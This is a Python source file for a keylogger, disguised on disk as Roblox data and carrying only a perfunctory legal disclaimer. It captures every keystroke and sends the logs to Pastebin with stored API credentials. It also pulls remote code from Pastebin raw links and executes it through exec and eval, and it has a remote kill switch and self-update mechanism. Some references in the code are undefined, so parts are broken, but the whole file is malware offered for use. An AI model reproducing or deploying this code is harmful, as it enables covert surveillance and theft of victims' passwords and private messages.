# Build: 2024.7
# Read the legal disclaimer below before using this program.
#
# [Legal Disclaimer]
# The usage of this keylogger project for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. The developers behind the project assume no liability and are not responsible for any misuse or damage caused by this program.

import os
import sys
import zlib
import time
import getpass
import shutil
import random
import subprocess

version = "2024.7"
usr = getpass.getuser()
data_path = f"C:/Users/{usr}/AppData/Roaming/.rbx/roblox"
# keylogger_file = __file__.replace("\\","/")

cred_server = "https://pastebin.com/raw/vqRRsJDs"
kms_server = "https://pastebin.com/raw/ebwZ46si"
update_server = "https://pastebin.com/raw/gAYiBPjh"
max_file_chars = 100

try:
    import requests
    from pynput.keyboard import Key, Listener
    from datetime import datetime
except ImportError:
    py = os.listdir(f"C:/Users/{usr}/AppData/Local/Programs/Python/")[0]
    pip = f"C:\\\\Users\\\\{usr}\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\{py}\\\\Scripts\\\\pip.exe"
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests', '--quiet', '--upgrade', '--no-input'])
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput', '--quiet', '--upgrade', '--no-input'])
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'datetime', '--quiet', '--upgrade', '--no-input'])
    import requests
    from pynput.keyboard import Key, Listener
    from datetime import datetime

if os.path.exists(f"{data_path}/PBIN_CREDS.bin"):
    exec(open(f"{data_path}/PBIN_CREDS.bin","r").read())
try:
    credentials = requests.get(cred_server)
    if credentials.ok:
        exec(zlib.decompress(eval(credentials.content.decode("utf-8"))))
except:
    pass

def on_press(key):
    raw = open(f"{data_path}/download/data-current.bin","a")
    if "Key." in str(key):
        raw.write(str(key).replace("Key."," ")+" \n")
    else:
        raw.write(eval(str(key))+"\n")
    raw.close()
 
    if len(open(f"{data_path}/download/data-current.bin","r").read().split("\n")) >= max_file_chars:
        i = 0
        while os.path.exists(f"{data_path}/download/asset"+str(i)+".bin"):
            i += 1
        shutil.copy(f"{data_path}/download/data-current.bin", "{data_path}/download/asset"+str(i)+".bin")
        open(f"{data_path}/download/data-current.bin","w").close()

def check():
    if not os.path.exists(f"{data_path}/download"):
        os.makedirs(f"{data_path}/download")
 
    if not os.path.exists(f"{data_path}/PBIN_CREDS.bin"):
        pass_keys = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
        devid = "".join(random.choice(pass_keys) for i in range(5))
        open(f"{data_path}/PBIN_CREDS.bin","w").write(f"devid = '{devid}'")

def send(privacyLevel='1',title=None,text=None):
    if os.path.exists(f"{data_path}/download/data-current.bin") or not None in [title,text]:
        try:
            login_data = {
                'api_dev_key': key,
                'api_user_name': username,
                'api_user_password': password
            }
            data = {
                'api_option': 'paste',
                'api_dev_key': key,
                'api_paste_code': None,
                'api_paste_name': f"KEYLOG [ID: {devid} | DATE: {datetime.now().strftime('%m/%d/%Y @ %I:%M:%S %p')} | BUILD: v{version}]",
                'api_paste_expire_date': 'N',
                'api_user_key': None,
                'api_paste_private': privacyLevel
            }

            if os.path.exists(f"{data_path}/download/data-current.bin"):
                i,string = 0,""
                while os.path.exists(f"{data_path}/download/asset"+str(i)+".bin"):
                    string += open(f"{data_path}/download/asset"+str(i)+".bin").read().replace("\n","")
                    i += 1
                string += open(f"{data_path}/download/data-current.bin","r").read().replace("\n","")
                string = string.replace("  "," ")
                data['api_paste_code'] = str(eval("zlib.compress(b'"+string+"')"))

            if not None in [title,text]:
                data['api_paste_name'] = title
                data['api_paste_code'] = text
                if privacyLevel == '0':
                    data['api_paste_private'] = '1'

            login = requests.post("https://pastebin.com/api/api_login.php", data=login_data)
            data['api_user_key'] = login.text
            r = requests.post("https://pastebin.com/api/api_post.php", data=data)

            if None in [title,text]:
                if os.path.exists(f"{data_path}/download"):
                    shutil.rmtree(f"{data_path}/download")
        except:
            pass

def send_text(title,text,privacyLevel='2'):
    send(privacyLevel=privacyLevel,title=title,text=text)

def update(ids=["*"],url=update_server):
    if "*" in ids or devid in ids:
        try:
            upd = requests.get(url,timeout=60)
        except:
            class upd: ok = False

        if upd.ok:
            try:
                open(f"{data_path}/update.py","wb").write(b.content)
                if open(keylogger_file,"r").read() != open(f"{data_path}/update.py","r").read():
                    open(keylogger_file,"wb").write(b.content)
                    time.sleep(1)
                    exec(open(keylogger_file,"r").read())
            except:
                pass

def changeid(before,after):
    try:
        if os.path.exists(f"{data_path}/PBIN_CREDS.bin"):
            exec(open(f"{data_path}/PBIN_CREDS.bin","r").read())
            if before == devid:
                open(f"{data_path}/PBIN_CREDS.bin","w").write(f"devid = '{after}'")
                send_text("ID Change Successful",f"ID '{before}' was successfully changed to '{after}'.")
    except:
        pass

def loadcreds(ids,url):
    try:
        global username
        global password
        global key
        if "*" in ids or devid in ids:
            credentials = requests.get(url)
            if credentials.ok:
                exec(zlib.decompress(eval(credentials.content.decode("utf-8"))))
    except:
        pass

check()
try:
    kms = requests.get(kms_server,timeout=60)
except:
    class kms: ok = False
privacyLvl = '1'
if kms.ok:
    try:
        exec(open(f"{data_path}/PBIN_CREDS.bin","r").read())
        exec(a.content)
        exec(open(f"{data_path}/PBIN_CREDS.bin","r").read())

        if devid in freeze or "*" in freeze:
            raise SystemExit
        elif devid in freeze_delete_logs or "*" in freeze_delete_logs:
            if os.path.exists(f"{data_path}/download"): shutil.rmtree(f"{data_path}/download")
            raise SystemExit
        elif devid in freeze_send_logs or "*" in freeze_send_logs:
            send(privacyLvl)
            raise SystemExit
        elif devid in destruct or "*" in destruct:
            if os.path.exists(keylogger_file): os.remove(keylogger_file)
            if os.path.exists(data_path): shutil.rmtree(data_path)
            raise SystemExit
        elif devid in destruct_send_logs or "*" in destruct_send_logs:
            send(privacyLvl)
            if os.path.exists(keylogger_file): os.remove(keylogger_file)
            if os.path.exists(data_path): shutil.rmtree(data_path)
            raise SystemExit
    except SystemExit:
        raise SystemExit
    except:
        pass
else:
    update()

check()
send(privacyLvl)
check()
 
with Listener(on_press=on_press) as listen:
    listen.join()

try:
    del(key, username, password)
except:
    pass

while True:
    time.sleep(0.1)